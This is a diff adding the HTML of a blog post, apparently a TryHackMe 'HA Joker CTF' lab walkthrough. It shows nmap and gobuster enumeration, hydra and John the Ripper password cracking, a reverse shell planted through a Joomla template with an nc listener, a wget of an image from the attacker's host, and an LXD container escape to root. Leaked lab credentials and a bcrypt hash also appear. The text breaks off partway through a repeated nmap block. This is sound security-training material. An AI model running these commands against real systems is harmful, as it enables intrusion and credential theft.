@@ -1,0 +1,664 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HA Joker CTF | CyFun</title><meta name=keywords content="ctf,tryhackme,penetration-testing,writeup,linux"><meta name=description content="HA Joker CTF TryHackMe writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/tryhackme/ha-joker-ctf/><link crossorigin=anonymous href=/assets/css/stylesheet.8c2cb9234a4e634b8528951f7a47ea89181178c7d2c333ce2c08dfee541ed427.css integrity="sha256-jCy5I0pOY0uFKJUfekfqiRgReMfSwzPOLAjf7lQe1Cc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/tryhackme/ha-joker-ctf/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="HA Joker CTF"><meta property="og:description" content="HA Joker CTF TryHackMe writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/tryhackme/ha-joker-ctf/"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2021-01-01T00:00:00+00:00"><meta property="article:modified_time" content="2026-03-01T00:10:22+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/0day/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/active-directory-basics/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/advent-of-cyber/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/advent-of-cyber-2/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/adventure-time/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/agent-sudo/"><meta name=twitter:card content="summary"><meta name=twitter:title content="HA Joker CTF"><meta name=twitter:description content="HA Joker CTF TryHackMe writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"TryHackMe Writeups","item":"https://s4ch.github.io/writeups/tryhackme/"},{"@type":"ListItem","position":3,"name":"HA Joker CTF","item":"https://s4ch.github.io/writeups/tryhackme/ha-joker-ctf/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HA Joker CTF","name":"HA Joker CTF","description":"HA Joker CTF TryHackMe writeup","keywords":["ctf","tryhackme","penetration-testing","writeup","linux"],"articleBody":"Batman hits Joker.\nHA Joker CTF\n💢 We will cover the topics Network Enumeration Web Enumeration Brute Forcing (http-get) Backup Poking Brute Forcing (Zip) Stored Passwords \u0026 Keys SQL Enumeration Brute Forcing (Hash) Exploitation (LXC) Task 1 HA Joker CTF We have developed this lab for the purpose of online penetration practices. Solving this lab is not that tough if you have proper basic knowledge of Penetration testing. Let’s start and learn how to breach it.\nEnumerate Services\nNmap Bruteforce\nPerforming Bruteforce on files over http Performing Bruteforce on Basic Authentication Hash Crack\nPerforming Bruteforce on hash to crack zip file Performing Bruteforce on hash to crack mysql user Exploitation\nGetting a reverse connection Spawning a TTY Shell Privilege Escalation\nGet root taking advantage of flaws in LXD 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 kali@kali:~/CTFs/tryhackme/HA Joker CTF$ sudo nmap -p- -sS -sC -sV -O 10.10.252.64 [sudo] password for kali: Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-08 19:57 CEST Nmap scan report for 10.10.252.64 Host is up (0.034s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA) | 256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA) |_ 256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: HA: Joker 8080/tcp open http Apache httpd 2.4.29 | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=Please enter the password. |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: 401 Unauthorized No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=10/8%OT=22%CT=1%CU=38238%PV=Y%DS=2%DC=I%G=Y%TM=5F7F533 OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=A)OPS OS:(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST1 OS:1NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN OS:(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 59.49 seconds Enumerate services on target machine.\nWhat version of Apache is it?\n80/tcp open http Apache httpd 2.4.29 ((Ubuntu))\n2.4.29\nWhat port on this machine not need to be authenticated by user and password? 1 2 3 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: HA: Joker 80\nThere is a file on this port that seems to be secret, what is it? 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 kali@kali:~/CTFs/tryhackme/HA Joker CTF$ gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.252.64 -x txt,php,html =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.252.64 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: html,txt,php [+] Timeout: 10s =============================================================== 2020/10/08 20:03:57 Starting gobuster =============================================================== /.hta (Status: 403) /.hta.txt (Status: 403) /.hta.php (Status: 403) /.hta.html (Status: 403) /.htaccess (Status: 403) /.htaccess.php (Status: 403) /.htaccess.html (Status: 403) /.htaccess.txt (Status: 403) /.htpasswd (Status: 403) /.htpasswd.txt (Status: 403) /.htpasswd.php (Status: 403) /.htpasswd.html (Status: 403) /css (Status: 301) /img (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /phpinfo.php (Status: 200) /phpinfo.php (Status: 200) /secret.txt (Status: 200) /server-status (Status: 403) =============================================================== 2020/10/08 20:05:04 Finished =============================================================== secret.txt\nThere is another file which reveals information of the backend, what is it? phpinfo.php\nWhen reading the secret file, We find with a conversation that seems contains at least two users and some keywords that can be intersting, what user do you think it is? http://10.10.252.64/secret.txt 1 2 3 4 5 Batman hits Joker. Joker: \"Bats you may be a rock but you won't break me.\" (Laughs!) Batman: \"I will break you with this rock. You made a mistake now.\" Joker: \"This is one of your 100 poor jokes, when will you get a sense of humor bats! You are dumb as a rock.\" Joker: \"HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA!\" What port on this machine need to be authenticated by Basic Authentication Mechanism? 1 2 3 4 8080/tcp open http Apache httpd 2.4.29 | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=Please enter the password. At this point we have one user and a url that needs to be aunthenticated, brute force it to get the password, what is that password? 1 2 3 4 5 6 7 8 9 kali@kali:~/CTFs/tryhackme/HA Joker CTF$ hydra -l joker -P /usr/share/wordlists/rockyou.txt -s 8080 10.10.252.64 -m / http-get Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-08 20:10:16 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking http-get://10.10.252.64:8080/ [8080][http-get] host: 10.10.252.64 login: joker password: hannah 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-08 20:10:47 hannah\nYeah!! We got the user and password and we see a cms based blog. Now check for directories and files in this port. What directory looks like as admin directory? http://10.10.252.64:8080/robots.txt 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 # If the Joomla site is installed within a folder # eg www.example.com/joomla/ then the robots.txt file # MUST be moved to the site root # eg www.example.com/robots.txt # AND the joomla folder name MUST be prefixed to all of the # paths. # eg the Disallow rule for the /administrator/ folder MUST # be changed to read # Disallow: /joomla/administrator/ # # For more information about the robots.txt standard, see: # http://www.robotstxt.org/orig.html # # For syntax checking, see: # http://tool.motoricerca.info/robots-checker.phtml User-agent: * Disallow: /administrator/ Disallow: /bin/ Disallow: /cache/ Disallow: /cli/ Disallow: /components/ Disallow: /includes/ Disallow: /installation/ Disallow: /language/ Disallow: /layouts/ Disallow: /libraries/ Disallow: /logs/ Disallow: /modules/ Disallow: /plugins/ Disallow: /tmp/ /administrator/\nWe need access to the administration of the site in order to get a shell, there is a backup file, What is this file? 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 kali@kali:~/CTFs/tryhackme/HA Joker CTF$ gobuster dir -U joker -P hannah -u http://10.10.252.64:8080/ -x bak,old,tar,gz,tgz,zip,7z -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.252.64:8080/ [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Auth User: joker [+] Extensions: gz,tgz,zip,7z,bak,old,tar [+] Timeout: 10s =============================================================== 2020/10/08 20:33:58 Starting gobuster =============================================================== /.hta (Status: 403) /.hta.tgz (Status: 403) /.hta.zip (Status: 403) /.hta.7z (Status: 403) /.hta.bak (Status: 403) /.hta.old (Status: 403) /.hta.tar (Status: 403) /.hta.gz (Status: 403) /.htaccess (Status: 403) /.htaccess.tar (Status: 403) /.htaccess.gz (Status: 403) /.htaccess.tgz (Status: 403) /.htaccess.zip (Status: 403) /.htaccess.7z (Status: 403) /.htaccess.bak (Status: 403) /.htaccess.old (Status: 403) /.htpasswd (Status: 403) /.htpasswd.bak (Status: 403) /.htpasswd.old (Status: 403) /.htpasswd.tar (Status: 403) /.htpasswd.gz (Status: 403) /.htpasswd.tgz (Status: 403) /.htpasswd.zip (Status: 403) /.htpasswd.7z (Status: 403) /LICENSE (Status: 200) /README (Status: 200) /administrator (Status: 301) /bin (Status: 301) /backup (Status: 200) /backup.zip (Status: 200) /cache (Status: 301) /components (Status: 301) /images (Status: 301) /includes (Status: 301) /index.php (Status: 200) /language (Status: 301) /layouts (Status: 301) /libraries (Status: 301) /media (Status: 301) /modules (Status: 301) /plugins (Status: 301) /robots (Status: 200) /robots.txt (Status: 200) ^C [!] Keyboard interrupt detected, terminating. =============================================================== 2020/10/08 20:35:44 Finished =============================================================== 1 backup.zip We have the backup file and now we should look for some information, for example database, configuration files, etc … But the backup file seems to be encrypted. What is the password? 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 kali@kali:~/CTFs/tryhackme/HA Joker CTF$ zip2john backup.zip \u003e backup.hash kali@kali:~/CTFs/tryhackme/HA Joker CTF$ john backup.hash Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 2 OpenMP threads Proceeding with single, rules:Single Press 'q' or Ctrl-C to abort, almost any other key for status Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance. Almost done: Processing the remaining buffered candidate passwords, if any. Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance. Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist hannah (backup.zip) 1g 0:00:00:00 DONE 2/3 (2020-10-08 20:19) 6.250g/s 501856p/s 501856c/s 501856C/s 123456..Peter Use the \"--show\" option to display all of the cracked passwords reliably Session completed hannah\nRemember that… We need access to the administration of the site… Blah blah blah. In our new discovery we see some files that have compromising information, maybe db? ok what if we do a restoration of the database! Some tables must have something like user_table! What is the super duper user? configuration.php\n1 2 3 4 5 6 public $dbtype = 'mysqli'; public $host = 'localhost'; public $user = 'joomla'; public $password = '1234'; public $db = 'joomladb'; public $dbprefix = 'cc1gr_'; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 kali@kali:~/CTFs/tryhackme/HA Joker CTF$ grep CREATE TABLE db/joomladb.sql | grep user grep: TABLE: No such file or directory db/joomladb.sql:CREATE TABLE `cc1gr_user_keys` ( db/joomladb.sql:CREATE TABLE `cc1gr_user_notes` ( db/joomladb.sql:CREATE TABLE `cc1gr_user_profiles` ( db/joomladb.sql:CREATE TABLE `cc1gr_user_usergroup_map` ( db/joomladb.sql:CREATE TABLE `cc1gr_usergroups` ( db/joomladb.sql:CREATE TABLE `cc1gr_users` ( kali@kali:~/CTFs/tryhackme/HA Joker CTF$ grep cc1gr_users db/joomladb.sql -- Table structure for table `cc1gr_users` DROP TABLE IF EXISTS `cc1gr_users`; CREATE TABLE `cc1gr_users` ( -- Dumping data for table `cc1gr_users` LOCK TABLES `cc1gr_users` WRITE; /*!40000 ALTER TABLE `cc1gr_users` DISABLE KEYS */; INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',0,1,'2019-10-08 12:00:15','2019-10-25 15:20:02','0','{\\\"admin_style\\\":\\\"\\\",\\\"admin_language\\\":\\\"\\\",\\\"language\\\":\\\"\\\",\\\"editor\\\":\\\"\\\",\\\"helpsite\\\":\\\"\\\",\\\"timezone\\\":\\\"\\\"}','0000-00-00 00:00:00',0,'','',0); /*!40000 ALTER TABLE `cc1gr_users` ENABLE KEYS */; kali@kali:~/CTFs/tryhackme/HA Joker CTF$ admin\nSuper Duper User! What is the password? 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 kali@kali:~/CTFs/tryhackme/HA Joker CTF$ john admin.hash /usr/share/wordlists/rockyou.txt --format=bcrypt Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 2 OpenMP threads Proceeding with single, rules:Single Press 'q' or Ctrl-C to abort, almost any other key for status Almost done: Processing the remaining buffered candidate passwords, if any. Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist abcd1234 (?) 1g 0:00:00:09 DONE 2/3 (2020-10-08 20:39) 0.1076g/s 79.44p/s 79.44c/s 79.44C/s yellow..allison Use the \"--show\" option to display all of the cracked passwords reliably Session completed kali@kali:~/CTFs/tryhackme/HA Joker CTF$ abcd1234\nAt this point, you should be upload a reverse-shell in order to gain shell access. What is the owner of this session? http://10.10.252.64:8080/administrator/index.php?option=com_templates\u0026view=template\u0026id=503\u0026file=L2Vycm9yLnBocA%3D%3D\nhttp://10.10.252.64:8080/templates/beez3/error.php\n1 2 3 4 5 6 7 8 9 kali@kali:~/CTFs/tryhackme/HA Joker CTF$ nc -nlvp 9001 listening on [any] 9001 ... connect to [10.8.106.222] from (UNKNOWN) [10.10.252.64] 43184 Linux ubuntu 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 11:46:07 up 53 min, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd) /bin/sh: 0: can't access tty; job control turned off $ www-data\nThis user belongs to a group that differs on your own group, What is this group? lxd\nSpawn a tty shell. SHELL=/bin/bash script -q /dev/null\nIn this question you should be do a basic research on how linux containers (LXD) work, it has a small online tutorial. Googling “lxd try it online”. https://linuxcontainers.org/lxd/introduction/\nResearch how to escalate privileges using LXD permissions and check to see if there are any images available on the box. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 www-data@ubuntu:/$ cd ~ cd ~ www-data@ubuntu:/var/www$ wget http://10.8.106.222/alpine-v3.12-x86_64-20201008_2055.tar.gz \u003c.8.106.222/alpine-v3.12-x86_64-20201008_2055.tar.gz --2020-10-08 11:58:36-- http://10.8.106.222/alpine-v3.12-x86_64-20201008_2055.tar.gz Connecting to 10.8.106.222:80... connected. HTTP request sent, awaiting response... 200 OK Length: 3183740 (3.0M) [application/gzip] Saving to: 'alpine-v3.12-x86_64-20201008_2055.tar.gz' 2020-10-08 11:58:38 (1.56 MB/s) - 'alpine-v3.12-x86_64-20201008_2055.tar.gz' saved [3183740/3183740] www-data@ubuntu:/var/www$ lxc image import alpine-v3.12-x86_64-20201008_2055.tar.gz --alias myalpine \u003cv3.12-x86_64-20201008_2055.tar.gz --alias myalpine www-data@ubuntu:/var/www$ lxc image list lxc image list +----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+ | ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE | +----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+ | myalpine | f2a9284c04f4 | no | alpine v3.12 (20201008_20:55) | x86_64 | 3.04MB | Oct 8, 2020 at 6:59pm (UTC) | +----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+ www-data@ubuntu:/var/www$ The idea here is to mount the root of the OS file system on the container, this should give us access to the root directory. Create the container with the privilege true and mount the root file system on /mnt in order to gain access to /root directory on host machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 www-data@ubuntu:/var/www$ lxc image import alpine-v3.12-x86_64-20200623_1255.tar.gz --alias myalpine \u003c-v3.12-x86_64-20200623_1255.tar.gz --alias myalpine Error: open alpine-v3.12-x86_64-20200623_1255.tar.gz: no such file or directory www-data@ubuntu:/var/www$ ls ls alpine-v3.12-x86_64-20201008_2055.tar.gz html www-data@ubuntu:/var/www$ lxc image import alpine-v3.12-x86_64-20201008_2055.tar.gz --alias myalpine \u003cv3.12-x86_64-20201008_2055.tar.gz --alias myalpine www-data@ubuntu:/var/www$ lxc image list lxc image list +----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+ | ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE | +----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+ | myalpine | f2a9284c04f4 | no | alpine v3.12 (20201008_20:55) | x86_64 | 3.04MB | Oct 8, 2020 at 6:59pm (UTC) | +----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+ www-data@ubuntu:/var/www$ lxc init myalpine joker -c security.privileged=true lxc init myalpine joker -c security.privileged=true Creating joker www-data@ubuntu:/var/www$ lxc config device add joker mydevice disk source=/ path=/mnt/root recursive=true \u003cydevice disk source=/ path=/mnt/root recursive=true Device mydevice added to joker www-data@ubuntu:/var/www$ lxc start joker lxc start joker www-data@ubuntu:/var/www$ lxc exec joker /bin/sh lxc exec joker /bin/sh What is the name of the file in the /root directory? 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ~ # ^[[26;5Rcat /mnt/root/root/final.txt cat /mnt/root/root/final.txt ██╗ ██████╗ ██╗ ██╗███████╗██████╗ ██║██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗ ██║██║ ██║█████╔╝ █████╗ ██████╔╝ ██ ██║██║ ██║██╔═██╗ ██╔══╝ ██╔══██╗ ╚█████╔╝╚██████╔╝██║ ██╗███████╗██║ ██║ ╚════╝ ╚═════╝ ╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝ !! Congrats you have finished this task !! Contact us here: Hacking Articles : https://twitter.com/rajchandel/ Aarti Singh: https://in.linkedin.com/in/aarti-singh-353698114 +-+-+-+-+-+ +-+-+-+-+-+-+-+ |E|n|j|o|y| |H|A|C|K|I|N|G| +-+-+-+-+-+ +-+-+-+-+-+-+-+ ~ # ^[[26;5R ","wordCount":"2371","inLanguage":"en","datePublished":"2021-01-01T00:00:00Z","dateModified":"2026-03-01T00:10:22+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/tryhackme/ha-joker-ctf/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/docs/ title=Docs><span>Docs</span></a></li><li><a href=https://s4ch.github.io/ctf/ title=CTF><span>CTF</span></a></li><li><a href=https://s4ch.github.io/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">HA Joker CTF</h1><div class=post-description>HA Joker CTF TryHackMe writeup</div><div class=post-meta><span title='2021-01-01 00:00:00 +0000 UTC'>January 1, 2021</span>&nbsp;·&nbsp;12 min&nbsp;·&nbsp;2371 words&nbsp;·&nbsp;
+<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
+,
+<a href=https://s4ch.github.io/tags/tryhackme/ class=post-tag title=tryhackme>tryhackme</a>
+,
+<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
+,
+<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
+,
+<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
+&nbsp;·&nbsp;
+<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#-we-will-cover--the-topics>💢 We will cover the topics</a></li><li><a href=#task-1-ha-joker-ctf>Task 1 HA Joker CTF</a></li></ul></nav></div></details></div><div class=post-content><p>Batman hits Joker.</p><p><a href=https://tryhackme.com/room/jokerctf>HA Joker CTF</a></p><h2 id=-we-will-cover--the-topics>💢 We will cover the topics<a hidden class=anchor aria-hidden=true href=#-we-will-cover--the-topics>#</a></h2><ul><li>Network Enumeration</li><li>Web Enumeration</li><li>Brute Forcing (http-get)</li><li>Backup Poking</li><li>Brute Forcing (Zip)</li><li>Stored Passwords & Keys</li><li>SQL Enumeration</li><li>Brute Forcing (Hash)</li><li>Exploitation (LXC)</li></ul><hr><h2 id=task-1-ha-joker-ctf>Task 1 HA Joker CTF<a hidden class=anchor aria-hidden=true href=#task-1-ha-joker-ctf>#</a></h2><p>We have developed this lab for the purpose of online penetration practices. Solving this lab is not that tough if you have proper basic knowledge of Penetration testing. Let’s start and learn how to breach it.</p><p><strong>Enumerate Services</strong></p><ul><li>Nmap</li></ul><p><strong>Bruteforce</strong></p><ul><li>Performing Bruteforce on files over http</li><li>Performing Bruteforce on Basic Authentication</li></ul><p><strong>Hash Crack</strong></p><ul><li>Performing Bruteforce on hash to crack zip file</li><li>Performing Bruteforce on hash to crack mysql user</li></ul><p><strong>Exploitation</strong></p><ul><li>Getting a reverse connection</li><li>Spawning a TTY Shell</li></ul><p><strong>Privilege Escalation</strong></p><ul><li>Get root taking advantage of flaws in LXD</li></ul><hr><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/HA Joker CTF$ sudo nmap -p- -sS -sC -sV -O 10.10.252.64
+</span></span><span class=line><span class=cl>[sudo] password for kali:
+</span></span><span class=line><span class=cl>Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-08 19:57 CEST
+</span></span><span class=line><span class=cl>Nmap scan report for 10.10.252.64
+</span></span><span class=line><span class=cl>Host is up (0.034s latency).
+</span></span><span class=line><span class=cl>Not shown: 65532 closed ports
+</span></span><span class=line><span class=cl>PORT     STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+</span></span><span class=line><span class=cl>| ssh-hostkey:
+</span></span><span class=line><span class=cl>|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)
